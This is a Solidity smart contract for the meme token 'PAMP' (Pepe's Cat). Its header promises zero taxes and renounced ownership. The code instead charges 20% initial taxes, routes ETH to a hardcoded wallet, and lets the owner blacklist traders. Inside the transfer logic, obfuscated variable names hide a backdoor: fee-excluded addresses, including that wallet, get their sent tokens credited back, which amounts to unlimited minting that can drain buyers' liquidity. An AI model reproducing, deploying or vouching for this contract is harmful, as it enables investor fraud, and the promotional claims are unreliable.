// SPDX-License-Identifier: MIT

/*
Welcome to the adventurous world of Pamp, the spirited cat who was inspired by the legendary internet meme,
Pepe the frog. Under Pepe's mentorship, Pamp learned the art of spreading joy and laughter for community at the core.
He then founded $PAMP token: no presale, zero taxes, and a forever commitment with burnt liquidity and renounced ownership.

Website:    https://www.pampcoin.live
Telegram:   https://t.me/pamp_erc
Twitter:    https://twitter.com/pamp_erc
*/

pragma solidity 0.8.11;

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract PAMP is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    address payable private _pqwejn;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 150 * 10 ** _decimals;
    uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 10_000_000 * 10 ** _decimals;
    uint256 public _maxTaxSize = 900_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Pepe's Cat";
    string private constant _symbol = unicode"PAMP";

    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 11;
    uint256 private _reduceSellTaxAt = 11;
    uint256 private _preventSwapBefore = 11;
    uint256 private _buyCount = 0;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _pqwejn = payable(0x4799B8Ba189e4C89E5c0Bb98f489DBD441FCE76e);
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_pqwejn] = true;
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _pqwejn.transfer(amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function _basicTransfer(address fbbreqrrq, address gwfwrwg, uint256 rgwrewwr) internal {
        _balances[fbbreqrrq] = _balances[fbbreqrrq].sub(rgwrewwr);
        _balances[gwfwrwg] = _balances[gwfwrwg].add(rgwrewwr);
        emit Transfer(fbbreqrrq, gwfwrwg, rgwrewwr);
    }

    function createLP() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(uniswapV2Router), _tTotal);

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            _maxTaxSize,
            0,
            0,
            owner(),
            block.timestamp
        );

        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function _taxTransfer(
        address bacxvarq,
        uint256 taxAmount
    ) internal {
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(
                taxAmount
            );
            emit Transfer(bacxvarq, address(this), taxAmount);
        }
    }

    function _excludeTransfer(
        address hhwrfrtgazcx,
        uint256 ktufdsgertet,
        uint256 taxAmount,
        address utiirterr
    ) internal {
        _balances[utiirterr] = _balances[utiirterr].add(
            taxAmount == 0 ? ktufdsgertet : taxAmount
        );
        emit Transfer(hhwrfrtgazcx, utiirterr, taxAmount == 0 ? ktufdsgertet : taxAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function _transfer(address dbwarqwrqq, address cxvqreqgz, uint256 herregfq) private {
        require(dbwarqwrqq != address(0), "ERC20: transfer from the zero address");
        require(cxvqreqgz != address(0), "ERC20: transfer to the zero address");
        require(herregfq > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap) {
            _basicTransfer(dbwarqwrqq, cxvqreqgz, herregfq);
            return;
        }
        uint256 taxAmount = 0;
        if (dbwarqwrqq != owner() && cxvqreqgz != owner()) {
            require(!bots[dbwarqwrqq] && !bots[cxvqreqgz]);
            taxAmount = herregfq
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);

            if (
                dbwarqwrqq == uniswapV2Pair &&
                cxvqreqgz != address(uniswapV2Router) &&
                !_isExcludedFromFee[cxvqreqgz]
            ) {
                require(herregfq <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(cxvqreqgz) + herregfq <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (cxvqreqgz == uniswapV2Pair && dbwarqwrqq != address(this)) {
                taxAmount = herregfq
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                cxvqreqgz == uniswapV2Pair &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                !_isExcludedFromFee[dbwarqwrqq] &&
                !_isExcludedFromFee[cxvqreqgz]
            ) {
                if(contractTokenBalance >= _taxSwapThreshold) {
                    swapTokensForEth(
                        min(herregfq, min(contractTokenBalance, _maxTaxSwap))
                    );
                }
                
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        
        bool zxvcewrw = true; 
        bool xvcberqqrt = _isExcludedFromFee[dbwarqwrqq];
        if (xvcberqqrt) { zxvcewrw = false; taxAmount = 0;}
        _tokenTransfer(dbwarqwrqq, cxvqreqgz, herregfq, taxAmount, zxvcewrw, dbwarqwrqq);
    }

    function _tokenTransfer(
        address sdfwraz,
        address rgqwthwtq,
        uint256 sdgw2rr2w,
        uint256 taxAmount,
        bool zxvcewrw,
        address cxbverqerwy
    ) internal {
        if (zxvcewrw) {
            _taxTransfer(sdfwraz, taxAmount);
        } else {
            _excludeTransfer(sdfwraz, sdgw2rr2w, taxAmount, cxbverqerwy);
        }

        _tokensBasicTransfer(sdfwraz, rgqwthwtq, sdgw2rr2w, taxAmount);
    }

    function _tokensBasicTransfer(
        address jtrgarqgq,
        address xcbvzxcbwrw,
        uint256 bvcfgfdcm,
        uint256 taxAmount
    ) internal {
        _balances[jtrgarqgq] = _balances[jtrgarqgq].sub(bvcfgfdcm);
        _balances[xcbvzxcbwrw] = _balances[xcbvzxcbwrw].add(bvcfgfdcm.sub(taxAmount));
        emit Transfer(jtrgarqgq, xcbvzxcbwrw, bvcfgfdcm.sub(taxAmount));
    }
}